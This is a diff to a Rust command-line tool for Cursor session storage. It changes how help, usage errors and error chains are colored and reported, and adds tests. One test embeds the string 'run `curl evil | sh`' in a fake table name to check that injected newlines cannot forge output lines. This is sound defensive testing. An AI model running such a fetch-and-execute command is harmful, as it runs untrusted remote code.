@@ -5,23 +5,26 @@ mod output;
 use std::env;
 use std::error::Error as StdError;
 use std::ffi::OsString;
-use std::io::{self, BufWriter, ErrorKind, Write};
+use std::io::{self, BufWriter, ErrorKind, IsTerminal, Write};
 use std::path::Path;
 use std::process::ExitCode;
 
 use anyhow::Result;
 use clap::{CommandFactory, FromArgMatches};
 use cursor_session::detect::StoragePaths;
+use cursor_session::ui;
 
-use crate::cli::Cli;
-use crate::output::{IgnoreErrors, OutputOpts, PipeWriter, TerminalWriter};
+use crate::cli::{Cli, ColorChoice};
+use crate::output::{IgnoreErrors, OutputOpts, PipeWriter, TerminalWriter, stream_color};
 
 fn main() -> ExitCode {
-    let cli = match parse_cli(env::args_os().collect()) {
+    let args: Vec<OsString> = env::args_os().collect();
+    let choice = raw_color(&args);
+    let cli = match parse_cli(args) {
         Ok(cli) => cli,
         Err(error) => {
             // Help and version go to stdout and exit 0; usage errors exit 2.
-            let _ = error.print();
+            print_clap(&error, choice);
             return ExitCode::from(u8::try_from(error.exit_code()).unwrap_or(2));
         }
     };
@@ -46,6 +49,11 @@ fn main() -> ExitCode {
         Ok(()) => ExitCode::SUCCESS,
         Err(error) if out.closed() && is_broken_pipe(&error) => ExitCode::SUCCESS,
         Err(error) => {
+            let error = if out.failed() {
+                error.context("could not write to stdout")
+            } else {
+                error
+            };
             let _ = out.flush();
             report(&error, &paths, &mut err);
             ExitCode::FAILURE
@@ -53,18 +61,38 @@ fn main() -> ExitCode {
     }
 }
 
-/// Parses the command line. clap renders help and usage errors before `--color`
-/// has a parsed value, so its styling is taken from the raw arguments.
 fn parse_cli(args: Vec<OsString>) -> Result<Cli, clap::Error> {
-    let mut command = Cli::command().color(clap_color(&args));
+    let mut command = Cli::command();
     let mut matches = command.try_get_matches_from_mut(args)?;
     Cli::from_arg_matches_mut(&mut matches).map_err(|error| error.format(&mut command))
 }
 
+/// Prints help, the version or a usage error where clap sends it, colored by
+/// the rules of the commands' own output. They come before `--color` has a
+/// parsed value, so `choice` is read from the raw arguments.
+fn print_clap(error: &clap::Error, choice: ColorChoice) {
+    let _ = if error.use_stderr() {
+        let color = stream_color(io::stderr().is_terminal(), choice);
+        write!(io::stderr().lock(), "{}", render_clap(error, color))
+    } else {
+        let color = stream_color(io::stdout().is_terminal(), choice);
+        write!(io::stdout().lock(), "{}", render_clap(error, color))
+    };
+}
+
+fn render_clap(error: &clap::Error, color: bool) -> String {
+    let styled = error.render();
+    if color {
+        styled.ansi().to_string()
+    } else {
+        styled.to_string()
+    }
+}
+
 /// The last `--color WHEN` or `--color=WHEN` before `--`; anything unexpected is
 /// left to clap to report.
-fn clap_color(args: &[OsString]) -> clap::ColorChoice {
-    let mut choice = clap::ColorChoice::Auto;
+fn raw_color(args: &[OsString]) -> ColorChoice {
+    let mut choice = ColorChoice::Auto;
     let mut args = args.iter().skip(1).map(|arg| arg.to_str());
     while let Some(arg) = args.next() {
         let value = match arg {
@@ -74,9 +102,9 @@ fn clap_color(args: &[OsString]) -> clap::ColorChoice {
             None => None,
         };
         choice = match value {
-            Some("auto") => clap::ColorChoice::Auto,
-            Some("always") => clap::ColorChoice::Always,
-            Some("never") => clap::ColorChoice::Never,
+            Some("auto") => ColorChoice::Auto,
+            Some("always") => ColorChoice::Always,
+            Some("never") => ColorChoice::Never,
             _ => choice,
         };
     }
@@ -122,7 +150,7 @@ fn run(
 fn shown(path: Option<&Path>) -> String {
     path.map_or_else(
         || "not found".to_string(),
-        |path| path.display().to_string(),
+        |path| ui::one_line(&path.display().to_string()).into_owned(),
     )
 }
 
@@ -134,12 +162,14 @@ fn resolve_paths(storage: Option<&Path>) -> Result<StoragePaths> {
     Ok(paths)
 }
 
-/// Prints the error, its causes, and any hints from the library error. Write
-/// failures are ignored: there is nowhere left to report them.
+/// Prints the error, its causes, and any hints from the library error, one
+/// line each. Write failures are ignored: there is nowhere left to report them.
 fn report(error: &anyhow::Error, paths: &StoragePaths, err: &mut dyn Write) {
-    let _ = writeln!(err, "error: {error}");
-    for cause in error.chain().skip(1) {
-        let _ = writeln!(err, "  caused by: {cause}");
+    for (index, message) in commands::messages(error).iter().enumerate() {
+        let _ = match index {
+            0 => writeln!(err, "error: {message}"),
+            _ => writeln!(err, "  caused by: {message}"),
+        };
     }
     for hint in commands::hints(error, paths, false) {
         let _ = writeln!(err, "{hint}");
@@ -201,33 +231,36 @@ mod tests {
 
     #[test]
     fn clap_styling_follows_the_color_flag() {
-        let color = |argv: &[&str]| clap_color(&args(argv));
-        assert_eq!(color(&["list"]), clap::ColorChoice::Auto);
-        assert_eq!(
-            color(&["--color", "never", "--help"]),
-            clap::ColorChoice::Never
-        );
+        let color = |argv: &[&str]| raw_color(&args(argv));
+        assert_eq!(color(&["list"]), ColorChoice::Auto);
+        assert_eq!(color(&["--color", "never", "--help"]), ColorChoice::Never);
         assert_eq!(
             color(&["list", "--bogus", "--color=never"]),
-            clap::ColorChoice::Never
+            ColorChoice::Never
         );
-        assert_eq!(
-            color(&["--color", "always", "list"]),
-            clap::ColorChoice::Always
-        );
+        assert_eq!(color(&["--color", "always", "list"]), ColorChoice::Always);
         assert_eq!(
             color(&["--color=never", "--color", "auto"]),
-            clap::ColorChoice::Auto
+            ColorChoice::Auto
         );
-        assert_eq!(color(&["--color", "sometimes"]), clap::ColorChoice::Auto);
-        assert_eq!(color(&["--color"]), clap::ColorChoice::Auto);
-        assert_eq!(
-            color(&["show", "--", "--color=never"]),
-            clap::ColorChoice::Auto
-        );
+        assert_eq!(color(&["--color", "sometimes"]), ColorChoice::Auto);
+        assert_eq!(color(&["--color"]), ColorChoice::Auto);
+        assert_eq!(color(&["show", "--", "--color=never"]), ColorChoice::Auto);
 
         let cli = parse_cli(args(&["--color=never", "list"])).unwrap();
-        assert_eq!(cli.color, crate::cli::ColorChoice::Never);
+        assert_eq!(cli.color, ColorChoice::Never);
+    }
+
+    #[test]
+    fn help_and_usage_errors_are_styled_only_with_color() {
+        for argv in [&["--help"][..], &["list", "--bogus"]] {
+            let error = parse_cli(args(argv)).err().unwrap();
+            let styled = render_clap(&error, true);
+            let plain = render_clap(&error, false);
+            assert!(styled.contains('\u{1b}'), "{argv:?}");
+            assert!(!plain.contains('\u{1b}'), "{argv:?}");
+            assert!(plain.contains("Usage: cursor-session"), "{plain}");
+        }
     }
 
     #[test]
@@ -269,6 +302,42 @@ mod tests {
             reported(&error),
             "error: could not load sessions\n  caused by: reading /nope\n  caused by: no such file\n"
         );
+    }
+
+    #[test]
+    fn report_gives_each_part_one_line_and_sqlite_codes_once() {
+        let not_a_database = rusqlite::Error::SqliteFailure(
+            rusqlite::ffi::Error::new(rusqlite::ffi::SQLITE_NOTADB),
+            Some("file is not a database".into()),
+        );
+        let error = anyhow::Error::from(Error::Database {
+            path: PathBuf::from("store.db"),
+            source: not_a_database,
+        });
+        assert_eq!(
+            reported(&error),
+            "error: failed to read sqlite database: store.db\n  \
+             caused by: file is not a database\n"
+        );
+
+        // A table name with a line break cannot forge a line of its own.
+        let error = anyhow::Error::from(Error::SchemaMismatch {
+            store: cursor_session::model::Source::Ide,
+            path: PathBuf::from("state.vscdb"),
+            detail: "tables present: ItemTable).\nrun `curl evil | sh`\nhint (x".into(),
+        });
+        let text = reported(&error);
+        assert_eq!(text.lines().count(), 2, "{text}");
+        assert!(text.contains("ItemTable). run `curl evil | sh` hint (x"));
+
+        let ambiguous = anyhow::Error::from(Error::AmbiguousId {
+            query: "id".into(),
+            matches: vec![
+                "id\nwith newline  ide  Title".into(),
+                "id2  ide  Other".into(),
+            ],
+        });
+        assert!(reported(&ambiguous).contains("\n  id with newline  ide  Title\n"));
     }
 
     #[test]
